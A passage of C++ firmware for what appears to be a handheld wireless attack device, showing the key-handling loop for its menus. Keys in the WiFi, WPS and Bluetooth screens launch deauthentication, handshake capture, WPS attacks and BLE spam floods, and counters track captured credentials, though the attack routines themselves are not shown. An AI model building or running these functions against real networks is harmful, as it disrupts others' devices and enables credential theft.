                        else if (menuSelection == 13) startRF433();
                        else if (menuSelection == 14) startLoRaScanner();
                        else if (menuSelection == 15) startRFIDNFC();
                        else if (menuSelection == 16) startBluetooth();
                        else if (menuSelection == 17) showLogViewer();
                        else if (menuSelection == 18) startNekoPet();
                        else if (menuSelection == 19) startTutorial();
                        else if (menuSelection == 20) startAchievements();
                        else if (menuSelection == 21) showSystemInfo();
                    }
                }
                // File Manager navigation
                else if (currentMode == MODE_FILE_MANAGER) {
                    if (key == ';') { // Arrow up
                        if (selectedFile > 0) {
                            selectedFile--;
                            if (selectedFile < fileListScroll) {
                                fileListScroll = selectedFile;
                            }
                            drawFileManager();
                        }
                    }
                    else if (key == '.') { // Arrow down
                        if (selectedFile < fileList.size() - 1) {
                            selectedFile++;
                            if (selectedFile >= fileListScroll + 6) {
                                fileListScroll = selectedFile - 5;
                            }
                            drawFileManager();
                        }
                    }
                    else if (key == 0x0D) { // Enter - open file
                        if (fileList.size() > 0) {
                            String selected = fileList[selectedFile];
                            if (selected != "[SD Card Error]" && selected != "[Invalid Directory]" && 
                                selected != "[Empty Directory]") {
                                openFile(selected);
                            }
                        }
                    }
                }
                // WiFi list navigation
                else if (currentMode == MODE_WIFI_SCAN) {
                    if (key == ';') { // Arrow up
                        if (selectedNetwork > 0) {
                            selectedNetwork--;
                            drawWiFiList();
                        }
                    }
                    else if (key == '.') { // Arrow down
                        if (selectedNetwork < networkCount - 1) {
                            selectedNetwork++;
                            drawWiFiList();
                        }
                    }
                    else if (key == 'd' || key == 'D') {
                        startDeauth();
                    }
                    else if (key == 'h' || key == 'H') {
                        startHandshakeCapture();
                    }
                }
                // WPS Attack navigation
                else if (currentMode == MODE_WPS_ATTACK) {
                    if (key == ';') { // Arrow up
                        if (selectedNetwork > 0) {
                            selectedNetwork--;
                            drawWPSAttack();
                        }
                    }
                    else if (key == '.') { // Arrow down
                        if (selectedNetwork < networkCount - 1) {
                            selectedNetwork++;
                            drawWPSAttack();
                        }
                    }
                    else if (key == 0x0D) { // Enter - select target
                        if (networkCount > 0) {
                            wpsTargetSSID = networks[selectedNetwork].ssid;
                            memcpy(wpsTargetBSSID, networks[selectedNetwork].bssid, 6);
                            drawWPSAttack();
                        }
                    }
                }
                // IR Remote navigation
                else if (currentMode == MODE_IR_REMOTE) {
                    if (key == ';') { // Arrow up
                        if (selectedIRCode > 0) {
                            selectedIRCode--;
                            drawIRRemote();
                        }
                    }
                    else if (key == '.') { // Arrow down
                        if (selectedIRCode < irCodeCount - 1) {
                            selectedIRCode++;
                            drawIRRemote();
                        }
                    }
                }
                // RF 433MHz navigation
                else if (currentMode == MODE_RF433) {
                    if (key == ';') { // Arrow up
                        if (selectedRFCode > 0) {
                            selectedRFCode--;
                            drawRF433();
                        }
                    }
                    else if (key == '.') { // Arrow down
                        if (selectedRFCode < rfCodeCount - 1) {
                            selectedRFCode++;
                            drawRF433();
                        }
                    }
                }
                // LoRa Scanner navigation
                else if (currentMode == MODE_LORA_SCANNER) {
                    if (key == ';') { // Arrow up
                        if (selectedLoRaDevice > 0) {
                            selectedLoRaDevice--;
                            drawLoRaScanner();
                        }
                    }
                    else if (key == '.') { // Arrow down
                        if (selectedLoRaDevice < loraDeviceCount - 1) {
                            selectedLoRaDevice++;
                            drawLoRaScanner();
                        }
                    }
                }
                // Bluetooth Attacks navigation
                else if (currentMode == MODE_BLUETOOTH) {
                    if (key == '1') {
                        if (bleModule) {
                            bleModule->startSourApple();
                            drawBluetooth();
                        }
                    }
                    else if (key == '2') {
                        if (bleModule) {
                            bleModule->startSamsungSpam();
                            drawBluetooth();
                        }
                    }
                    else if (key == '3') {
                        if (bleModule) {
                            bleModule->startGoogleSpam();
                            drawBluetooth();
                        }
                    }
                    else if (key == '4') {
                        if (bleModule) {
                            bleModule->startMicrosoftSpam();
                            drawBluetooth();
                        }
                    }
                    else if (key == '5') {
                        if (bleModule) {
                            bleModule->startSpamAll();
                            drawBluetooth();
                        }
                    }
                    else if (key == '0') {
                        if (bleModule) {
                            bleModule->stop();
                            drawBluetooth();
                        }
                    }
                }
                // Statistics navigation
                else if (currentMode == MODE_STATISTICS) {
                    if (key == 'r' || key == 'R') {
                        // Reset statistics
                        totalScans = 0;
                        totalNetworksFound = 0;
                        totalAPsLogged = 0;
                        totalDeauthSent = 0;
                        totalBeaconsSent = 0;
                        totalProbesSent = 0;
                        totalHandshakesCaptured = 0;
                        totalCredentialsCaptured = 0;
                        wpsVulnerableAPs = 0;
                        wpsPinsTried = 0;
                        sessionStartTime = millis();
                        
                        saveStats(); // Save reset stats
                        drawStatistics();
                        
                        Serial.println("📊 Statistics reset");
                    }
                }
                // Log Viewer navigation
                else if (currentMode == MODE_LOG_VIEWER) {
                    if (key == ';') { // Arrow up - scroll up
                        if (logViewScroll < logCount - 10) {
                            logViewScroll++;
                            showLogViewer();
                        }
                    }
                    else if (key == '.') { // Arrow down - scroll down
                        if (logViewScroll > 0) {
                            logViewScroll--;
                            showLogViewer();
                        }
                    }
                }
            }
        }
    }
    
    delay(10);
}
